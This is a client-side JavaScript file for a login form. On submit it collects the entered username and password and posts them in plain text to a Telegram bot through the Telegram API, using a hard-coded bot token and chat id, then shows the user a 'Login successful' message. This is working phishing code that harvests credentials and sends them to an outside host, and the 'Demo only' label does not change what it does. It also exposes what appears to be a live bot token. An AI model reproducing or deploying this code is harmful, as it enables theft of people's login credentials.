document.addEventListener('DOMContentLoaded', function() {
    // Set current year in footer
    document.getElementById('currentYear').textContent = new Date().getFullYear();
    
    // Form submission handling
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.querySelector('.login-btn');
    
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get form values
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const rememberMe = document.getElementById('remember').checked;
        
        // Basic validation
        if (!username || !password) {
            showAlert('Please enter both username and password', 'error');
            return;
        }
        
        // Disable button during submission
        loginBtn.disabled = true;
        loginBtn.textContent = 'Signing in...';
        
        try {
            // Send credentials to Telegram bot
            const success = await sendToTelegram(username, password);
            
            if (success) {
                showAlert('Login successful! (Demo only)', 'success');
                loginForm.reset();
            } else {
                showAlert('Failed to send login data', 'error');
            }
        } catch (error) {
            console.error('Error:', error);
            showAlert('An error occurred', 'error');
        } finally {
            // Re-enable button
            loginBtn.disabled = false;
            loginBtn.textContent = 'Sign In';
        }
    });
    
    // Function to send data to Telegram
    async function sendToTelegram(username, password) {
        const botToken = '7760561204:AAHjNGFDUxHeDHBeoR4L1uqIv_77J_ARmDA';
        const chatId = '7760561204';
        const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
            
            const data = await response.json();
            console.log('Telegram API response:', data);
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Function to show alert messages
    function showAlert(message, type) {
        // Remove any existing alerts
        const existingAlert = document.querySelector('.alert-message');
        if (existingAlert) {
            existingAlert.remove();
        }
        
        // Create alert element
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert-message alert-${type}`;
        alertDiv.textContent = message;
        
        // Insert after the form
        const form = document.querySelector('.login-form');
        form.insertAdjacentElement('afterend', alertDiv);
        
        // Remove after 5 seconds
        setTimeout(() => {
            alertDiv.remove();
        }, 5000);
    }
    
    // Responsive adjustments
    function handleResize() {
        // Could add responsive JS behaviors here if needed
    }
    
    window.addEventListener('resize', handleResize);
    handleResize();
});